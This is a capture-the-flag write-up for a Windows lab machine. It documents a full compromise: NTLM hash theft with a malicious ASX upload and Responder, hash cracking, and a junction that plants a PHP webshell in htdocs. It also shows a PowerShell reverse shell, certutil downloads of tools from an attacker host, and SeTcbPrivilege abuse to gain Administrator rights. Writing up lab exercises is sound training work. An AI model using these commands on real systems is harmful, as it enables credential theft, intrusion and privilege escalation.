## Initial Access

Browsing to the website, we find an upload function that looks interesting. A test upload returns a message indicating that someone on the team will review the submission.

This suggests that an employee or automated process may access the uploaded files, making NTLM theft worth testing.

We can use the `ntlm_theft` tool by Greenwolf to generate a malicious file compatible with Windows Media Player and see if we can capture a NetNTLMv2 challenge-response.

```bash
python3 ntlm_theft.py -g asx -s 10.10.14.106 -f /home/kali/Boxes/Media/intro
```

We start Responder on our attack machine:

```bash
sudo responder -I tun0
```

After uploading the malicious file, we receive a NetNTLMv2 hash from the server, which we can attempt to crack with Hashcat.

```text
[SMB] NTLMv2-SSP Client   : 10.129.45.91
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:17ca7a482df5179e:1DF02EEF45C42F <redacted>
```

```powershell
PS C:\hashcat-7.1.2> .\hashcat.exe -m 5600 .\media.hash .\rockyou.txt

enox:<redacted>
```

After cracking the hash, we can use the SSH service discovered earlier to obtain a shell as `enox` and retrieve the user flag.

We transfer `winPEAS` to the target to look for potential privilege escalation paths:

```powershell
certutil -urlcache -split -f http://10.10.14.106:8001/winPEAS.exe C:\Users\enox\Desktop\winPEAS.exe
```

`winPEAS` doesn't directly find any low-hanging fruits, so we inspect the PHP code behind the upload functionality.

## Upload Functionality

The relevant part of `index.php` is:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
    $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
    $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
    $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

    $folderName = md5($firstname . $lastname . $email);
    $targetDir = $uploadDir . $folderName . '/';

    if (!file_exists($targetDir)) {
        mkdir($targetDir, 0777, true);
    }

    $originalFilename = $_FILES["fileToUpload"]["name"];
    $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);
    $targetFile = $targetDir . $sanitizedFilename;

    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
        $todoFile = $uploadDir . 'todo.txt';
        $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";
        file_put_contents($todoFile, $todoContent, FILE_APPEND);
    }
}
```

The upload directory is based on an MD5 hash of the submitted first name, last name and email address. We can reproduce the directory name locally:

```text
php > $fn = "media";
php > $ln = "media";
php > $mail = "media@htb.com";
php > echo md5($fn . $ln . $mail);
6155a271368fa14d3dd084f08bf3daca
```

## Junction Abuse

Since the upload directory grants Full Control to Everyone, we can try redirecting one of the upload paths to Apache's `htdocs` directory. The application writes uploaded files directly to the generated path, so we can replace that path with a junction pointing to `C:\xampp\htdocs`.

We can test this by generating a new directory name and creating a junction at that location. The directory name is derived from `firstname + lastname + email`, so we can choose arbitrary values:

```text
Firstname: foo
Lastname: bar
Email: foo@bar.com
```

```bash
echo -n 'foobarfoo@bar.com' | md5sum
beefb40925db9ee54560bb7f90d37d0d  -
```

Creating the junction:

```powershell
PS C:\windows\tasks\uploads> New-Item -ItemType Junction -Path "C:\Windows\Tasks\Uploads\beefb40925db9ee54560bb7f90d37d0d" -Target "C:\xampp\htdocs"
```

Or via CMD:

```cmd
mklink /J C:\Windows\Tasks\Uploads\beefb40925db9ee54560bb7f90d37d0d C:\xampp\htdocs
```

We can now upload a PHP webshell through the application. Because the upload path resolves through our junction, the file is written to `C:\xampp\htdocs` and becomes accessible through the web server.

```bash
curl http://media.htb/shell.php?cmd=whoami
nt authority\local service
```

## Privilege Escalation

We can use the webshell to obtain a PowerShell reverse shell.

```bash
nc -lnvp 4445
```

```bash
curl http://media.htb/shell.php?cmd=powershell%20<base64>
```

Checking the privileges of the resulting shell shows that `SeTcbPrivilege` is present:

```text
nt authority\local service
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

`SeTcbPrivilege` lets a process act as part of the operating system and interact with security tokens. We can leverage it using the [SeTcbPrivilege abuse PoC](https://github.com/b4lisong/SeTcbPrivilege-Abuse).

Download the PoC from our web server:

```powershell
certutil -urlcache -split -f http://10.10.14.106:8001/TcbElevation-x64.exe C:\xampp\htdocs\TcbElevation.exe
```

`TcbElevation.exe` can spawn a process using an elevated token. Rather than spawning another reverse shell, we can use it to add `enox` to the local Administrators group:

```powershell
.\TcbElevation.exe elevate 'net localgroup Administrators enox /add'
```

We can verify that `enox` has been added:

```text
PS C:\xampp\htdocs> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
enox
The command completed successfully.
```

We restart our SSH session as `enox` so the new group membership is reflected in our access token.

```powershell
enox@MEDIA C:\Users\Administrator\Desktop>type root.txt
a9a7182f125<redacted>
```

## Summary

The attack chain was:

1. Identify the file upload functionality.
2. Trigger a NetNTLMv2 authentication attempt using a malicious ASX file.
3. Capture and crack the `enox` NetNTLMv2 response.
4. Access the machine over SSH as `enox`.
5. Abuse writable upload directories to create a junction into Apache's `htdocs` directory.
6. Upload and execute a PHP webshell as `NT AUTHORITY\LOCAL SERVICE`.
7. Abuse `SeTcbPrivilege` to add `enox` to the local Administrators group.
8. Reconnect over SSH and retrieve the root flag.
